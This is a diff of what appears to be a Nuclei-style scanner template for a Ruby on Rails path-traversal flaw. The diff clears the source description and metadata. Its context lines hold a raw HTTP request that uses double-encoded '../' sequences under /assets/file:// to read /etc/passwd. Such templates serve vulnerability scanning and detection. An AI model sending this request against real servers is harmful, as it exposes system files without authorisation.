@@ -3,12 +3,8 @@ info:
   name: Ruby On Rails 路径穿越漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zd30q0k7c9h6dfb2'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zd30q0k7c9h6dfb2
-    fofa: 暂无
 http:
 - raw:
   - 'GET /assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1
